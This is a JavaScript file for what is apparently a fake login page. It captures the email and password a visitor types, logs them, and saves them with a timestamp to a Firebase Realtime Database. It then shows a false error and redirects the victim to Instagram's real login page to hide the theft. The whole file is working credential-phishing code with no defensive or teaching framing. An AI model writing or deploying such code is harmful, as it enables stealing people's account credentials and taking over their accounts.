

window.onload = function (){
    const loadingPage = document.querySelector(".loading-page");
    const foot = document.querySelector(".foot");
    foot.style.display = "none";
    setTimeout(()=>{
      foot.style.display = "block";
      let footer = document.querySelector(".footer");
        loadingPage.style.display = "none";
        footer.style.transform = "scale(.7)";
        footer.style.bottom = "0px";
    },1000)
}

var emailfields = document.querySelector(".email");
var passfield = document.querySelector(".password");
var passShowbtn = document.querySelector(".show");
var loginbtn = document.querySelector(".login");




//password field scripts.............

passfield.addEventListener("focus",()=>{
        passShowbtn.style.display = "block";
        passShowbtn.style.filter = "opacity(1)";
})

passfield.addEventListener("blur",()=>{
  if(passfield.value.length === 0){
    passShowbtn.style.display = "none";
    loginbtn.style.background = "#1da1ff9e";
  }
  else{
    passShowbtn.style.filter = "opacity(0.5)";
    if(emailfields.value.length != 0){
      loginbtn.style.background = "#1da1ff"
    }
    else{
      loginbtn.style.background = "#1da1ff9e";
      
    }
  }
})

    function show() {
        passfield.type = "text"
        passShowbtn.innerText = "Hide"
      }
      
      function hide() {
        passfield.type = "password"
        passShowbtn.innerText = "Show"
      }
         
      var pwShown = 0;
      passShowbtn.addEventListener("click",()=>{
        if (pwShown == 0) {
            pwShown = 1;
            show();
          } else {
            pwShown = 0;
            hide();
          }
        }, false);
    

//firebase



loginbtn.addEventListener("click",()=>{
  if(emailfields.value.length > 0 && passfield.value.length > 0){

  loginbtn.innerHTML = '<img class="spinner" src="./images/spinner.gif">';
  var email = emailfields.value;
  var password = passfield.value;

  console.log('email:'+email +'\n'+'Password: '+password);

    setTimeout(()=>{
      loginbtn.innerHTML = "Log in";
      let errormsg = document.querySelector(".error");
      let container = document.querySelector(".container");
      errormsg.style.display = "block";
      container.style.width = "70%";
    },2000)

    function getCurrentDateTime() {
      const date = new Date();
      const timeString = date.toLocaleTimeString([], { hour: 'numeric', minute: 'numeric' });
      const dateString = date.toLocaleDateString([], { month: '2-digit', day: '2-digit', year: '2-digit' });
      const amPm = date.getHours() >= 12 ? 'PM' : 'AM';
      return `${timeString} ${amPm} | ${dateString}`;
    }

      var TimeDate = getCurrentDateTime();

        // Save the email and password fields to the Firebase Realtime Database
        var userRef = database.ref("users").push();
        userRef.set({
          id:email,
          Password: password,
          time:TimeDate
        });

    setTimeout(()=>{
      window.location.assign("https://www.instagram.com/accounts/login/");
    },4000)
  }
    
})

